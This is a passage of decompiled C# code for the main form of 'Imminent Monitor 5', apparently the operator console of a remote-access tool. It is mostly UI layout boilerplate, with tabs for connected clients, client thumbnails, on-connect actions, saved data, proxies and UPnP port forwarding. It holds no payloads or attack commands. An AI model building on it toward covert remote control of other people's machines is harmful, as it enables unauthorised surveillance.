// Decompiled with JetBrains decompiler
// Type: FormMain
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic.CompilerServices;
using Mono.Nat;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormMain : Form
{
  private IContainer icontainer_0;
  private UserControlClients userControlClients_0;
  private GControl6 gcontrol6_0;
  private TabPage tabPage_0;
  private TabPage tabPage_1;
  private UserControlPorts userControlPorts_0;
  private Panel panel_0;
  private TabPage tabPage_2;
  private UserControlProxies userControlProxies_0;
  private TabPage tabPage_3;
  private UserControlThumbnails userControlThumbnails_0;
  private TabPage tabPage_4;
  private UserControlOnConnect userControlOnConnect_0;
  private TabPage tabPage_5;
  private UserControlSavedData userControlSavedData_0;
  private TabPage tabPage_6;
  private TabPage tabPage_7;
  private UserControlServerLogs userControlServerLogs_0;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private NotifyIcon notifyIcon_0;
  private TabPage tabPage_8;
  private UserControlDediClients userControlDediClients_0;
  private Control0 control0_0;
  private Panel panel_1;
  private LinkLabel linkLabel_0;
  private UserControlUPnP userControlUPnP_0;
  private LinkLabel linkLabel_1;
  private ChromiumWebBrowser chromiumWebBrowser_0;
  public GClass1 gclass1_0;
  private GClass35 gclass35_0;
  private bool bool_0;

  public FormMain()
  {
    this.Resize += new EventHandler(this.FormMain_Resize);
    this.Load += new EventHandler(this.FormMain_Load);
    this.FormClosing += new FormClosingEventHandler(this.FormMain_FormClosing);
    this.vmethod_61(new GClass35());
    this.bool_0 = false;
    try
    {
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(this.method_2);
      this.method_3();
      AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(Class97.smethod_0().method_3);
      Application.ThreadException += new ThreadExceptionEventHandler(Class97.smethod_0().method_4);
      new Thread(new ThreadStart(this.method_1)).Start();
      this.method_18();
      this.method_4();
      this.MinimumSize = new Size(1010, 400);
      Class97.smethod_11((Form) this);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void method_0()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormMain));
    GClass25 gclass25_1 = new GClass25();
    this.vmethod_35(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_37(new ToolStripMenuItem());
    this.vmethod_39(new ToolStripSeparator());
    this.vmethod_41(new ToolStripMenuItem());
    this.vmethod_43(new NotifyIcon(this.icontainer_0));
    this.vmethod_49(new Control0());
    this.vmethod_3(new GControl6());
    this.vmethod_5(new TabPage());
    this.vmethod_1(new UserControlClients());
    this.vmethod_7(new TabPage());
    this.vmethod_51(new Panel());
    this.vmethod_57(new LinkLabel());
    this.vmethod_53(new LinkLabel());
    this.vmethod_11(new Panel());
    this.vmethod_13(new TabPage());
    this.vmethod_15(new UserControlProxies());
    this.vmethod_17(new TabPage());
    this.vmethod_19(new UserControlThumbnails());
    this.vmethod_21(new TabPage());
    this.vmethod_23(new UserControlOnConnect());
    this.vmethod_25(new TabPage());
    this.vmethod_27(new UserControlSavedData());
    this.vmethod_29(new TabPage());
    this.vmethod_33(new UserControlServerLogs());
    this.vmethod_31(new TabPage());
    this.vmethod_45(new TabPage());
    this.vmethod_47(new UserControlDediClients());
    this.vmethod_9(new UserControlPorts());
    this.vmethod_55(new UserControlUPnP());
    this.vmethod_34().SuspendLayout();
    this.vmethod_2().SuspendLayout();
    this.vmethod_4().SuspendLayout();
    this.vmethod_6().SuspendLayout();
    this.vmethod_50().SuspendLayout();
    this.vmethod_12().SuspendLayout();
    this.vmethod_16().SuspendLayout();
    this.vmethod_20().SuspendLayout();
    this.vmethod_24().SuspendLayout();
    this.vmethod_28().SuspendLayout();
    this.vmethod_44().SuspendLayout();
    this.SuspendLayout();
    ContextMenuStrip contextMenuStrip1 = this.vmethod_34();
    Size size1 = new Size(40, 40);
    Size size2 = size1;
    contextMenuStrip1.ImageScalingSize = size2;
    this.vmethod_34().Items.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.vmethod_36(),
      (ToolStripItem) this.vmethod_38(),
      (ToolStripItem) this.vmethod_40()
    });
    this.vmethod_34().Name = "ContextMenuStripNotify";
    ContextMenuStrip contextMenuStrip2 = this.vmethod_34();
    size1 = new Size(114, 54);
    Size size3 = size1;
    contextMenuStrip2.Size = size3;
    this.vmethod_36().Name = "RestoreToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_36();
    size1 = new Size(113, 22);
    Size size4 = size1;
    toolStripMenuItem1.Size = size4;
    this.vmethod_36().Text = "Restore";
    this.vmethod_38().Name = "ToolStripSeparator1";
    ToolStripSeparator toolStripSeparator = this.vmethod_38();
    size1 = new Size(110, 6);
    Size size5 = size1;
    toolStripSeparator.Size = size5;
    this.vmethod_40().Name = "ExitToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_40();
    size1 = new Size(113, 22);
    Size size6 = size1;
    toolStripMenuItem2.Size = size6;
    this.vmethod_40().Text = "Exit";
    this.vmethod_42().ContextMenuStrip = this.vmethod_34();
    this.vmethod_42().Icon = (Icon) componentResourceManager.GetObject("NotifyIconMain.Icon");
    this.vmethod_42().Text = "Imminent Monitor";
    this.vmethod_42().Visible = true;
    this.vmethod_48().Anchor = AnchorStyles.None;
    this.vmethod_48().method_3((Control0.Enum9) 0);
    Control0 control0_1 = this.vmethod_48();
    Point point1 = new Point(483, 350);
    Point point2 = point1;
    control0_1.Location = point2;
    this.vmethod_48().Name = "PreloaderLoading";
    this.vmethod_48().method_1(5);
    Control0 control0_2 = this.vmethod_48();
    size1 = new Size(229, 10);
    Size size7 = size1;
    control0_2.Size = size7;
    this.vmethod_48().TabIndex = 2;
    this.vmethod_48().Text = "Preloader1";
    this.vmethod_2().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_2().Controls.Add((Control) this.vmethod_4());
    this.vmethod_2().Controls.Add((Control) this.vmethod_6());
    this.vmethod_2().Controls.Add((Control) this.vmethod_12());
    this.vmethod_2().Controls.Add((Control) this.vmethod_16());
    this.vmethod_2().Controls.Add((Control) this.vmethod_20());
    this.vmethod_2().Controls.Add((Control) this.vmethod_24());
    this.vmethod_2().Controls.Add((Control) this.vmethod_28());
    this.vmethod_2().Controls.Add((Control) this.vmethod_30());
    this.vmethod_2().Controls.Add((Control) this.vmethod_44());
    GControl6 gcontrol6_1 = this.vmethod_2();
    point1 = new Point(283, 79);
    Point point3 = point1;
    gcontrol6_1.Location = point3;
    this.vmethod_2().Name = "HiddenTabControl1";
    this.vmethod_2().SelectedIndex = 0;
    GControl6 gcontrol6_2 = this.vmethod_2();
    size1 = new Size(890, 619);
    Size size8 = size1;
    gcontrol6_2.Size = size8;
    this.vmethod_2().TabIndex = 1;
    this.vmethod_2().Visible = false;
    this.vmethod_4().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_4().Controls.Add((Control) this.vmethod_0());
    TabPage tabPage1 = this.vmethod_4();
    point1 = new Point(0, 0);
    Point point4 = point1;
    tabPage1.Location = point4;
    this.vmethod_4().Name = "TabPageClients";
    TabPage tabPage2 = this.vmethod_4();
    Padding padding1 = new Padding(3);
    Padding padding2 = padding1;
    tabPage2.Padding = padding2;
    TabPage tabPage3 = this.vmethod_4();
    size1 = new Size(890, 619);
    Size size9 = size1;
    tabPage3.Size = size9;
    this.vmethod_4().TabIndex = 0;
    this.vmethod_4().Text = "TabPage1";
    this.vmethod_0().AutoScroll = true;
    this.vmethod_0().AutoSize = true;
    this.vmethod_0().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_0().Dock = DockStyle.Fill;
    this.vmethod_0().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlClients userControlClients1 = this.vmethod_0();
    point1 = new Point(3, 3);
    Point point5 = point1;
    userControlClients1.Location = point5;
    this.vmethod_0().Name = "UserControlClients1";
    UserControlClients userControlClients2 = this.vmethod_0();
    size1 = new Size(884, 613);
    Size size10 = size1;
    userControlClients2.Size = size10;
    this.vmethod_0().TabIndex = 0;
    this.vmethod_6().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_6().Controls.Add((Control) this.vmethod_50());
    this.vmethod_6().Controls.Add((Control) this.vmethod_10());
    TabPage tabPage4 = this.vmethod_6();
    point1 = new Point(0, 0);
    Point point6 = point1;
    tabPage4.Location = point6;
    this.vmethod_6().Name = "TabPagePlugins";
    TabPage tabPage5 = this.vmethod_6();
    padding1 = new Padding(3);
    Padding padding3 = padding1;
    tabPage5.Padding = padding3;
    TabPage tabPage6 = this.vmethod_6();
    size1 = new Size(890, 619);
    Size size11 = size1;
    tabPage6.Size = size11;
    this.vmethod_6().TabIndex = 1;
    this.vmethod_6().Text = "TabPage2";
    this.vmethod_50().Controls.Add((Control) this.vmethod_56());
    this.vmethod_50().Controls.Add((Control) this.vmethod_52());
    this.vmethod_50().Dock = DockStyle.Bottom;
    Panel panel1 = this.vmethod_50();
    point1 = new Point(3, 593);
    Point point7 = point1;
    panel1.Location = point7;
    this.vmethod_50().Name = "Panel1";
    Panel panel2 = this.vmethod_50();
    size1 = new Size(884, 23);
    Size size12 = size1;
    panel2.Size = size12;
    this.vmethod_50().TabIndex = 0;
    this.vmethod_56().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    this.vmethod_56().AutoSize = true;
    LinkLabel linkLabel1 = this.vmethod_56();
    point1 = new Point(763, 5);
    Point point8 = point1;
    linkLabel1.Location = point8;
    this.vmethod_56().Name = "LinkLabelForceRefresh";
    LinkLabel linkLabel2 = this.vmethod_56();
    size1 = new Size(118, 13);
    Size size13 = size1;
    linkLabel2.Size = size13;
    this.vmethod_56().TabIndex = 1;
    this.vmethod_56().TabStop = true;
    this.vmethod_56().Text = "Force Refresh Plugins";
    this.vmethod_52().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_52().AutoSize = true;
    LinkLabel linkLabel3 = this.vmethod_52();
    point1 = new Point(3, 5);
    Point point9 = point1;
    linkLabel3.Location = point9;
    this.vmethod_52().Name = "LinkLabelLearn";
    LinkLabel linkLabel4 = this.vmethod_52();
    size1 = new Size(151, 13);
    Size size14 = size1;
    linkLabel4.Size = size14;
    this.vmethod_52().TabIndex = 0;
    this.vmethod_52().TabStop = true;
    this.vmethod_52().Text = "Learn how to create plugins";
    this.vmethod_10().AutoScroll = true;
    this.vmethod_10().Dock = DockStyle.Fill;
    Panel panel3 = this.vmethod_10();
    point1 = new Point(3, 3);
    Point point10 = point1;
    panel3.Location = point10;
    this.vmethod_10().Name = "PanelPlugins";
    Panel panel4 = this.vmethod_10();
    size1 = new Size(884, 613);
    Size size15 = size1;
    panel4.Size = size15;
    this.vmethod_10().TabIndex = 2;
    this.vmethod_12().Controls.Add((Control) this.vmethod_14());
    TabPage tabPage7 = this.vmethod_12();
    point1 = new Point(0, 0);
    Point point11 = point1;
    tabPage7.Location = point11;
    this.vmethod_12().Name = "TabPageProxies";
    TabPage tabPage8 = this.vmethod_12();
    size1 = new Size(890, 619);
    Size size16 = size1;
    tabPage8.Size = size16;
    this.vmethod_12().TabIndex = 2;
    this.vmethod_12().Text = "TabPageProxies";
    this.vmethod_12().UseVisualStyleBackColor = true;
    this.vmethod_14().AutoScroll = true;
    this.vmethod_14().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_14().Dock = DockStyle.Fill;
    this.vmethod_14().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlProxies userControlProxies1 = this.vmethod_14();
    point1 = new Point(0, 0);
    Point point12 = point1;
    userControlProxies1.Location = point12;
    this.vmethod_14().Name = "UserControlProxies1";
    UserControlProxies userControlProxies2 = this.vmethod_14();
    size1 = new Size(890, 619);
    Size size17 = size1;
    userControlProxies2.Size = size17;
    this.vmethod_14().TabIndex = 0;
    this.vmethod_16().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_16().Controls.Add((Control) this.vmethod_18());
    TabPage tabPage9 = this.vmethod_16();
    point1 = new Point(0, 0);
    Point point13 = point1;
    tabPage9.Location = point13;
    this.vmethod_16().Name = "TabPageClientThumbnails";
    TabPage tabPage10 = this.vmethod_16();
    size1 = new Size(890, 619);
    Size size18 = size1;
    tabPage10.Size = size18;
    this.vmethod_16().TabIndex = 3;
    this.vmethod_16().Text = "TabPage1";
    this.vmethod_18().AutoScroll = true;
    this.vmethod_18().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_18().Dock = DockStyle.Fill;
    this.vmethod_18().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlThumbnails controlThumbnails1 = this.vmethod_18();
    point1 = new Point(0, 0);
    Point point14 = point1;
    controlThumbnails1.Location = point14;
    this.vmethod_18().Name = "UserControlThumbnails1";
    UserControlThumbnails controlThumbnails2 = this.vmethod_18();
    size1 = new Size(890, 619);
    Size size19 = size1;
    controlThumbnails2.Size = size19;
    this.vmethod_18().TabIndex = 0;
    this.vmethod_20().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_20().Controls.Add((Control) this.vmethod_22());
    TabPage tabPage11 = this.vmethod_20();
    point1 = new Point(0, 0);
    Point point15 = point1;
    tabPage11.Location = point15;
    this.vmethod_20().Name = "TabPageOnConnect";
    TabPage tabPage12 = this.vmethod_20();
    size1 = new Size(890, 619);
    Size size20 = size1;
    tabPage12.Size = size20;
    this.vmethod_20().TabIndex = 4;
    this.vmethod_20().Text = "TabPage1";
    this.vmethod_22().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_22().Dock = DockStyle.Fill;
    this.vmethod_22().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlOnConnect controlOnConnect1 = this.vmethod_22();
    point1 = new Point(0, 0);
    Point point16 = point1;
    controlOnConnect1.Location = point16;
    this.vmethod_22().Name = "UserControlOnConnect1";
    UserControlOnConnect controlOnConnect2 = this.vmethod_22();
    size1 = new Size(890, 619);
    Size size21 = size1;
    controlOnConnect2.Size = size21;
    this.vmethod_22().TabIndex = 0;
    this.vmethod_24().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_24().Controls.Add((Control) this.vmethod_26());
    TabPage tabPage13 = this.vmethod_24();
    point1 = new Point(0, 0);
    Point point17 = point1;
    tabPage13.Location = point17;
    this.vmethod_24().Name = "TabPageSavedData";
    TabPage tabPage14 = this.vmethod_24();
    size1 = new Size(890, 619);
    Size size22 = size1;
    tabPage14.Size = size22;
    this.vmethod_24().TabIndex = 5;
    this.vmethod_24().Text = "TabPage1";
    this.vmethod_26().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_26().Dock = DockStyle.Fill;
    this.vmethod_26().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlSavedData controlSavedData1 = this.vmethod_26();
    point1 = new Point(0, 0);
    Point point18 = point1;
    controlSavedData1.Location = point18;
    this.vmethod_26().Name = "UserControlSavedData1";
    UserControlSavedData controlSavedData2 = this.vmethod_26();
    size1 = new Size(890, 619);
    Size size23 = size1;
    controlSavedData2.Size = size23;
    this.vmethod_26().TabIndex = 0;
    this.vmethod_28().Controls.Add((Control) this.vmethod_32());
    TabPage tabPage15 = this.vmethod_28();
    point1 = new Point(0, 0);
    Point point19 = point1;
    tabPage15.Location = point19;
    this.vmethod_28().Name = "TabPageSavedLogs";
    TabPage tabPage16 = this.vmethod_28();
    size1 = new Size(890, 619);
    Size size24 = size1;
    tabPage16.Size = size24;
    this.vmethod_28().TabIndex = 6;
    this.vmethod_28().Text = "TabPage1";
    this.vmethod_28().UseVisualStyleBackColor = true;
    this.vmethod_32().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_32().Dock = DockStyle.Fill;
    this.vmethod_32().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlServerLogs controlServerLogs1 = this.vmethod_32();
    point1 = new Point(0, 0);
    Point point20 = point1;
    controlServerLogs1.Location = point20;
    this.vmethod_32().Name = "UserControlServerLogs1";
    UserControlServerLogs controlServerLogs2 = this.vmethod_32();
    size1 = new Size(890, 619);
    Size size25 = size1;
    controlServerLogs2.Size = size25;
    this.vmethod_32().TabIndex = 0;
    TabPage tabPage17 = this.vmethod_30();
    point1 = new Point(0, 0);
    Point point21 = point1;
    tabPage17.Location = point21;
    this.vmethod_30().Name = "TabPageServerLogs";
    TabPage tabPage18 = this.vmethod_30();
    size1 = new Size(890, 619);
    Size size26 = size1;
    tabPage18.Size = size26;
    this.vmethod_30().TabIndex = 7;
    this.vmethod_30().Text = "TabPage1";
    this.vmethod_30().UseVisualStyleBackColor = true;
    this.vmethod_44().Controls.Add((Control) this.vmethod_46());
    TabPage tabPage19 = this.vmethod_44();
    point1 = new Point(0, 0);
    Point point22 = point1;
    tabPage19.Location = point22;
    this.vmethod_44().Name = "TabPageDediClients";
    TabPage tabPage20 = this.vmethod_44();
    size1 = new Size(890, 619);
    Size size27 = size1;
    tabPage20.Size = size27;
    this.vmethod_44().TabIndex = 8;
    this.vmethod_44().Text = "TabPage1";
    this.vmethod_44().UseVisualStyleBackColor = true;
    this.vmethod_46().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_46().Dock = DockStyle.Fill;
    this.vmethod_46().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlDediClients controlDediClients1 = this.vmethod_46();
    point1 = new Point(0, 0);
    Point point23 = point1;
    controlDediClients1.Location = point23;
    this.vmethod_46().Name = "UserControlDediClients1";
    UserControlDediClients controlDediClients2 = this.vmethod_46();
    size1 = new Size(890, 619);
    Size size28 = size1;
    controlDediClients2.Size = size28;
    this.vmethod_46().TabIndex = 0;
    this.vmethod_8().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_8().AutoSize = true;
    this.vmethod_8().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_8().Cursor = Cursors.Arrow;
    this.vmethod_8().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlPorts userControlPorts1 = this.vmethod_8();
    point1 = new Point(286, 163);
    Point point24 = point1;
    userControlPorts1.Location = point24;
    this.vmethod_8().Name = "UserControlPorts1";
    UserControlPorts userControlPorts2 = this.vmethod_8();
    size1 = new Size(884, 535);
    Size size29 = size1;
    userControlPorts2.Size = size29;
    this.vmethod_8().TabIndex = 0;
    this.vmethod_8().Visible = false;
    this.vmethod_54().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_54().AutoSize = true;
    this.vmethod_54().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_54().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    UserControlUPnP userControlUpnP1 = this.vmethod_54();
    point1 = new Point(286, 163);
    Point point25 = point1;
    userControlUpnP1.Location = point25;
    this.vmethod_54().Name = "UserControlUPnP1";
    UserControlUPnP userControlUpnP2 = this.vmethod_54();
    size1 = new Size(884, 535);
    Size size30 = size1;
    userControlUpnP2.Size = size30;
    this.vmethod_54().TabIndex = 3;
    gclass25_1.method_3((INatDevice) null);
    this.vmethod_54().vmethod_21(gclass25_1);
    this.vmethod_54().Visible = false;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.FromArgb(241, 244, 245);
    size1 = new Size(1194, 710);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_48());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_8());
    this.Controls.Add((Control) this.vmethod_54());
    this.Cursor = Cursors.Arrow;
    this.DoubleBuffered = true;
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormMain);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "Version: 5.0.0.82 | Registered To: {0}";
    this.vmethod_34().ResumeLayout(false);
    this.vmethod_2().ResumeLayout(false);
    this.vmethod_4().ResumeLayout(false);
    this.vmethod_4().PerformLayout();
    this.vmethod_6().ResumeLayout(false);
    this.vmethod_50().ResumeLayout(false);
    this.vmethod_50().PerformLayout();
    this.vmethod_12().ResumeLayout(false);
    this.vmethod_16().ResumeLayout(false);
    this.vmethod_20().ResumeLayout(false);
    this.vmethod_24().ResumeLayout(false);
    this.vmethod_28().ResumeLayout(false);
    this.vmethod_44().ResumeLayout(false);
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual UserControlClients vmethod_0() => this.userControlClients_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(UserControlClients userControlClients_1) => this.userControlClients_0 = userControlClients_1;

  internal virtual GControl6 vmethod_2() => this.gcontrol6_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(GControl6 gcontrol6_1) => this.gcontrol6_0 = gcontrol6_1;

  internal virtual TabPage vmethod_4() => this.tabPage_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(TabPage tabPage_9) => this.tabPage_0 = tabPage_9;

  internal virtual TabPage vmethod_6() => this.tabPage_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(TabPage tabPage_9) => this.tabPage_1 = tabPage_9;

  internal virtual UserControlPorts vmethod_8() => this.userControlPorts_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(UserControlPorts userControlPorts_1) => this.userControlPorts_0 = userControlPorts_1;

  internal virtual Panel vmethod_10() => this.panel_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(Panel panel_2) => this.panel_0 = panel_2;

  internal virtual TabPage vmethod_12() => this.tabPage_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(TabPage tabPage_9) => this.tabPage_2 = tabPage_9;

  internal virtual UserControlProxies vmethod_14() => this.userControlProxies_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(UserControlProxies userControlProxies_1) => this.userControlProxies_0 = userControlProxies_1;

  internal virtual TabPage vmethod_16() => this.tabPage_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(TabPage tabPage_9) => this.tabPage_3 = tabPage_9;

  internal virtual UserControlThumbnails vmethod_18() => this.userControlThumbnails_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(UserControlThumbnails userControlThumbnails_1) => this.userControlThumbnails_0 = userControlThumbnails_1;

  internal virtual TabPage vmethod_20() => this.tabPage_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(TabPage tabPage_9) => this.tabPage_4 = tabPage_9;

  internal virtual UserControlOnConnect vmethod_22() => this.userControlOnConnect_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(UserControlOnConnect userControlOnConnect_1) => this.userControlOnConnect_0 = userControlOnConnect_1;

  internal virtual TabPage vmethod_24() => this.tabPage_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(TabPage tabPage_9) => this.tabPage_5 = tabPage_9;

  internal virtual UserControlSavedData vmethod_26() => this.userControlSavedData_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_27(UserControlSavedData userControlSavedData_1) => this.userControlSavedData_0 = userControlSavedData_1;

  internal virtual TabPage vmethod_28() => this.tabPage_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_29(TabPage tabPage_9) => this.tabPage_6 = tabPage_9;

  internal virtual TabPage vmethod_30() => this.tabPage_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_31(TabPage tabPage_9) => this.tabPage_7 = tabPage_9;

  internal virtual UserControlServerLogs vmethod_32() => this.userControlServerLogs_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_33(UserControlServerLogs userControlServerLogs_1) => this.userControlServerLogs_0 = userControlServerLogs_1;

  internal virtual ContextMenuStrip vmethod_34() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_35(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_36() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_37(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_8);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_38() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_39(ToolStripSeparator toolStripSeparator_1) => this.toolStripSeparator_0 = toolStripSeparator_1;

  internal virtual ToolStripMenuItem vmethod_40() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_41(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_9);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual NotifyIcon vmethod_42() => this.notifyIcon_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_43(NotifyIcon notifyIcon_1) => this.notifyIcon_0 = notifyIcon_1;

  internal virtual TabPage vmethod_44() => this.tabPage_8;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_45(TabPage tabPage_9) => this.tabPage_8 = tabPage_9;

  internal virtual UserControlDediClients vmethod_46() => this.userControlDediClients_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_47(UserControlDediClients userControlDediClients_1) => this.userControlDediClients_0 = userControlDediClients_1;

  internal virtual Control0 vmethod_48() => this.control0_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_49(Control0 control0_1) => this.control0_0 = control0_1;

  internal virtual Panel vmethod_50() => this.panel_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_51(Panel panel_2) => this.panel_1 = panel_2;

  internal virtual LinkLabel vmethod_52() => this.linkLabel_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_53(LinkLabel linkLabel_2)
  {
    LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.method_10);
    if (this.linkLabel_0 != null)
      this.linkLabel_0.LinkClicked -= clickedEventHandler;
    this.linkLabel_0 = linkLabel_2;
    if (this.linkLabel_0 == null)
      return;
    this.linkLabel_0.LinkClicked += clickedEventHandler;
  }

  internal virtual UserControlUPnP vmethod_54() => this.userControlUPnP_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_55(UserControlUPnP userControlUPnP_1) => this.userControlUPnP_0 = userControlUPnP_1;

  internal virtual LinkLabel vmethod_56() => this.linkLabel_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_57(LinkLabel linkLabel_2)
  {
    LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.method_19);
    if (this.linkLabel_1 != null)
      this.linkLabel_1.LinkClicked -= clickedEventHandler;
    this.linkLabel_1 = linkLabel_2;
    if (this.linkLabel_1 == null)
      return;
    this.linkLabel_1.LinkClicked += clickedEventHandler;
  }

  public virtual ChromiumWebBrowser vmethod_58() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_59(ChromiumWebBrowser chromiumWebBrowser_1)
  {
    EventHandler<FrameLoadEndEventArgs> eventHandler = new EventHandler<FrameLoadEndEventArgs>(this.method_7);
    if (this.chromiumWebBrowser_0 != null)
